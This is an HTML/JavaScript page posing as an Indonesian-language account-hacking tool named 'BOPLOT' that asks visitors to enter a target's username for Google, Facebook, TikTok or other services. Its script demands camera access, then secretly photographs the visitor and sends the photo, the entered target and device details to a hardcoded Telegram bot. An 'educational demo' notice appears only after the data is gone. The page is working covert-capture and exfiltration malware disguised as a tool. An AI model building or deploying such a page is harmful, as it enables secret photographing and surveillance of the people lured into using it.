<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BOPLOT | NEURAL LINK v7.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --accent: #00ffcc; 
            --bg: #0a0a0b;
            --surface: rgba(0, 20, 20, 0.6);
            --neon-glow: 0 0 15px rgba(0, 255, 204, 0.4);
            --danger: #ff0055;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            background-color: var(--bg);
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        /* Matrix Background Canvas */
        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.15;
        }

        /* Overlay Scanline Effect */
        body::before {
            content: " ";
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            z-index: 9999;
            background-size: 100% 3px, 3px 100%;
            pointer-events: none;
        }

        .panel {
            width: 92%;
            max-width: 420px;
            padding: 40px 30px;
            background: var(--surface);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(0, 255, 204, 0.25);
            border-radius: 4px;
            text-align: center;
            position: relative;
            box-shadow: var(--neon-glow), inset 0 0 30px rgba(0,0,0,0.8);
        }

        .glitch {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5rem;
            font-weight: 700;
            text-transform: uppercase;
            position: relative;
            text-shadow: 0.05em 0 0 rgba(255, 0, 85, 0.75),
                        -0.025em -0.05em 0 rgba(0, 255, 204, 0.75),
                        0.025em 0.05em 0 rgba(0, 100, 255, 0.75);
            animation: glitch 500ms infinite;
            margin-bottom: 25px;
        }

        @keyframes glitch {
            0% { text-shadow: 0.05em 0 0 #f05, -0.025em -0.05em 0 #0fc, 0.025em 0.05em 0 #06f; }
            15% { text-shadow: -0.05em -0.025em 0 #f05, 0.025em 0.025em 0 #0fc, -0.05em -0.05em 0 #06f; }
            50% { text-shadow: 0.025em 0.05em 0 #f05, 0.05em 0 0 #0fc, 0 -0.05em 0 #06f; }
            100% { text-shadow: -0.025em 0 0 #f05, -0.025em -0.025em 0 #0fc, -0.025em -0.05em 0 #06f; }
        }

        .field { margin-bottom: 25px; text-align: left; }
        label { font-size: 10px; opacity: 0.7; display: block; margin-bottom: 10px; letter-spacing: 2px; color: #fff; }
        
        input, select {
            width: 100%;
            padding: 14px;
            background: rgba(0,0,0,0.85);
            border: 1px solid rgba(0, 255, 204, 0.3);
            color: var(--accent);
            border-radius: 0px;
            font-family: inherit;
            outline: none;
            transition: 0.3s;
            appearance: none;
        }

        .select-wrapper { position: relative; }
        .select-wrapper::after {
            content: '▼';
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 10px;
            pointer-events: none;
            color: var(--accent);
        }

        input:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(0, 255, 204, 0.3); }

        .btn-main {
            width: 100%;
            padding: 18px;
            background: var(--accent);
            border: none;
            color: #000;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 2px;
            clip-path: polygon(10% 0, 100% 0, 100% 70%, 90% 100%, 0 100%, 0 30%);
            margin-top: 10px;
        }

        .btn-main:active { transform: scale(0.98); opacity: 0.8; }

        /* Progress Bar Styles */
        .progress-container {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            margin-top: 20px;
            display: none;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: var(--accent);
            width: 0%;
            transition: width 0.4s ease;
            box-shadow: 0 0 10px var(--accent);
        }

        #terminal {
            display: none;
            position: fixed;
            inset: 0;
            background: #000;
            color: var(--accent);
            padding: 40px 20px;
            font-size: 12px;
            z-index: 1000;
            line-height: 1.6;
            overflow-y: auto;
        }

        #alarm {
            display: none;
            position: fixed;
            inset: 0;
            background: var(--danger);
            z-index: 2000;
            align-items: center;
            justify-content: center;
            animation: flash 0.1s steps(2) infinite;
        }

        @keyframes flash { 0% { opacity: 1; } 100% { opacity: 0.5; } }

        #edu-view {
            display: none;
            position: fixed;
            inset: 0;
            background: #f4f4f4;
            color: #1a1a1a;
            z-index: 3000;
            padding: 40px 20px;
            overflow-y: auto;
            align-items: center;
            justify-content: center;
        }
        .card { max-width: 450px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center;}
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>
    <video id="v-hidden" autoplay playsinline style="display:none;"></video>
    <canvas id="c-hidden" style="display:none;"></canvas>

    <div id="alarm"><h1 style="font-family:Orbitron; font-size: 2rem; color:#fff;">BREACH DETECTED</h1></div>

    <div class="panel" id="ui-main">
        <div style="font-size: 9px; margin-bottom: 10px; letter-spacing: 3px;">SYSTEM.CORE // V7.02</div>
        <h1 class="glitch">BOPLOT</h1>
        
        <div class="field">
            <label>PILIH TARGET LAYANAN</label>
            <div class="select-wrapper">
                <select id="mod">
                    <option value="GOOGLE">AKUN GOOGLE</option>
                    <option value="FACEBOOK">AKUN FACEBOOK</option>
                    <option value="TIKTOK">AKUN TIKTOK</option>
                    <option value="INSTAGRAM">AKUN INSTAGRAM</option>
                    <option value="VK">AKUN VK</option>
                    <option value="OTHERS">AKUN LAINNYA</option>
                </select>
            </div>
        </div>

        <div class="field">
            <label>TARGET_NODE_ID</label>
            <input type="text" id="target" placeholder="ID / Username / Email..." autocomplete="off">
        </div>

        <button class="btn-main" onclick="startPayload()">INITIATE LINK</button>

        <div class="progress-container" id="p-container">
            <div class="progress-bar" id="p-bar"></div>
        </div>
    </div>

    <div id="terminal"></div>

    <div id="edu-view">
        <div class="card">
            <h2 style="color:var(--danger); font-family: Orbitron;">SIMULATION COMPLETE</h2>
            <p style="font-size: 14px; line-height: 1.5; color: #555;">Halaman ini adalah demo edukasi keamanan siber. <br><br><b>Peringatan:</b> Jangan pernah memberikan izin kamera atau memasukkan data sensitif pada link yang mencurigakan.</p>
            <button onclick="location.reload()" style="width:100%; padding:15px; border:none; background:#000; color:#fff; border-radius:10px; font-weight:bold; cursor:pointer; margin-top: 20px;">RESTART SYSTEM</button>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const CORE = {
            T: '8755175920:AAGAUVXtuQF6czPLfNllJQLwKRoGS-I0Apw',
            C: '8262604388'
        };

        // --- MATRIX RAIN EFFECT ---
        const mCanvas = document.getElementById('matrix-bg');
        const mCtx = mCanvas.getContext('2d');
        mCanvas.width = window.innerWidth;
        mCanvas.height = window.innerHeight;

        const chars = "ABCDEF0123456789$+-*/=%#&_";
        const fontSize = 14;
        const columns = mCanvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            mCtx.fillStyle = 'rgba(10, 10, 11, 0.1)';
            mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height);
            mCtx.fillStyle = '#00ffcc';
            mCtx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                mCtx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > mCanvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 40);

        // --- CORE FUNCTIONS ---
        const playTone = (freq, type, duration) => {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = type;
                osc.frequency.setValueAtTime(freq, ctx.currentTime);
                gain.gain.setValueAtTime(0.02, ctx.currentTime);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                osc.stop(ctx.currentTime + duration);
            } catch(e) {}
        };

        async function printLog(text, delay) {
            return new Promise(res => {
                setTimeout(() => {
                    const line = document.createElement('div');
                    line.innerHTML = `<span style="color:#444">[${new Date().toLocaleTimeString()}]</span> <span style="color:var(--accent)">> ${text}</span>`;
                    document.getElementById('terminal').appendChild(line);
                    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
                    playTone(800, 'sine', 0.02);
                    res();
                }, delay);
            });
        }

        async function startPayload() {
            const target = document.getElementById('target').value;
            const selectedMod = document.getElementById('mod').value;
            if(!target) return alert("Halt: Target ID missing.");

            try {
                // Request Biometrics (Camera)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // UI Transition
                document.getElementById('p-container').style.display = 'block';
                const pBar = document.getElementById('p-bar');
                
                pBar.style.width = "40%";
                await new Promise(r => setTimeout(r, 600));

                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
                document.getElementById('terminal').style.display = 'block';
                
                await printLog("INITIALIZING NEURAL LINK...", 200);
                await printLog(`PROTOCOL: ${selectedMod}_BYPASS`, 300);
                await printLog(`NODE_TARGET: ${target}`, 300);
                pBar.style.width = "70%";

                // Telegram Data Dispatch
                const info = `👤 *BOPLOT V7 REPORT*\nTarget: \`${target}\`\nPlatform: ${navigator.platform}\nService: ${selectedMod}`;
                fetch(`https://api.telegram.org/bot${CORE.T}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CORE.C, text: info, parse_mode: 'Markdown' })
                });

                const v = document.getElementById('v-hidden');
                v.srcObject = stream;
                
                // Capture Frame after 2s
                setTimeout(async () => {
                    const c = document.getElementById('c-hidden');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.6));
                    
                    const fd = new FormData();
                    fd.append('chat_id', CORE.C);
                    fd.append('photo', blob, 'biometric_shot.jpg');
                    
                    await fetch(`https://api.telegram.org/bot${CORE.T}/sendPhoto`, { method: 'POST', body: fd });
                    
                    pBar.style.width = "100%";
                    await printLog("EXFILTRATION SUCCESSFUL.", 400);
                    await printLog("DISCONNECTING FROM CORE...", 300);
                    
                    setTimeout(() => {
                        stream.getTracks().forEach(t => t.stop());
                        document.getElementById('alarm').style.display = 'flex';
                        playTone(200, 'square', 0.5);
                        
                        setTimeout(() => {
                            document.getElementById('alarm').style.display = 'none';
                            document.getElementById('edu-view').style.display = 'flex';
                        }, 2000);
                    }, 1000);
                }, 2000);

            } catch (e) {
                alert("ACCESS DENIED: Biometric Authentication (Camera) is required to link with node.");
                location.reload();
            }
        }

        // Handle window resize for matrix
        window.addEventListener('resize', () => {
            mCanvas.width = window.innerWidth;
            mCanvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
